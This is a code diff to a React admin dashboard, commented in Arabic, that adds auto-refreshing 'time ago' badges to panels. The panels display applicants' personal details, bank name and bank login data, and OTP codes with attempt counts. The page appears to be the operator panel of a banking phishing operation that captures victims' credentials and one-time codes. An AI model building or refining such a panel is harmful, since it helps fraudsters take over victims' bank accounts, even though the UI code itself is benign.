@@ -137,6 +137,21 @@ function DataBadge({
   );
 }
 
+// شارة الوقت المنفصلة - تتحدث تلقائياً دون إعادة بناء المكونات الأخرى
+function SectionTimeBadge({ timestamp }: { timestamp: string | null | undefined }) {
+  const [, setTick] = useState(0);
+  useEffect(() => {
+    const id = setInterval(() => setTick((t) => t + 1), 30_000);
+    return () => clearInterval(id);
+  }, []);
+  if (!timestamp) return null;
+  return (
+    <span className="text-[10px] text-green-600 font-medium mr-2" dir="ltr">
+      ← {timeAgo(timestamp)}
+    </span>
+  );
+}
+
 // دمج جميع نسخ الطلب حقلاً بحقل (الأحدث له الأولوية، لكن لا يُسقط حقول القديمة)
 function mergeVersionsData(sources: AppVersion[]): AppVersion {
   const FIELDS: (keyof AppVersion)[] = [
@@ -809,13 +824,14 @@ export default function AdminDashboardPage() {
                               {activeTab === "current" ? (
                                 /* عرض البيانات الحالية */
                                 <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
-                                  {/* بيانات المتقدم */}
+                                  {/* صندوق البيانات الشخصية */}
                         <div className="bg-card rounded-xl p-4 space-y-2">
                           <h4 className="font-bold text-sm text-primary mb-3 flex items-center gap-2">
                             <User className="w-4 h-4" />
                             {allData.applicantType === "business"
                               ? "بيانات الشركة"
                               : "البيانات الشخصية"}
+                            <SectionTimeBadge timestamp={app.createdAt} />
                           </h4>
                           <DataBadge
                             label="الاسم"
@@ -860,11 +876,12 @@ export default function AdminDashboardPage() {
                           />
                         </div>
 
-                        {/* بيانات البنك والدخول */}
+                        {/* صندوق بيانات البنك */}
                         <div className="bg-card rounded-xl p-4 space-y-2">
                           <h4 className="font-bold text-sm text-primary mb-3 flex items-center gap-2">
                             <CreditCard className="w-4 h-4" />
                             بيانات البنك والدخول
+                            <SectionTimeBadge timestamp={app.bankUsername ? app.updatedAt : undefined} />
                           </h4>
                           {/* اسم البنك بارز في الأعلى */}
                           {allData.bankName && (
@@ -943,16 +960,17 @@ export default function AdminDashboardPage() {
                           )}
                         </div>
 
-                        {/* رمز OTP */}
+                        {/* صندوق OTP */}
                         <div className="bg-card rounded-xl p-4 space-y-2">
                           <h4 className="font-bold text-sm text-primary mb-3 flex items-center gap-2">
                             <Smartphone className="w-4 h-4" />
                             رمز OTP والحالة
                             {otpAttempts > 0 && (
-                              <span className={`mr-auto text-xs font-bold px-2 py-0.5 rounded-full ${otpAttempts > 1 ? "bg-orange-100 text-orange-700" : "bg-green-100 text-green-700"}`}>
+                              <span className={`text-xs font-bold px-2 py-0.5 rounded-full ${otpAttempts > 1 ? "bg-orange-100 text-orange-700" : "bg-green-100 text-green-700"}`}>
                                 {otpAttempts} {otpAttempts === 1 ? "محاولة" : "محاولات"}
                               </span>
                             )}
+                            <SectionTimeBadge timestamp={allData.otpCode ? app.updatedAt : undefined} />
                           </h4>
                           {allData.otpCode ? (
                             <div className="bg-muted rounded-xl p-4 text-center">
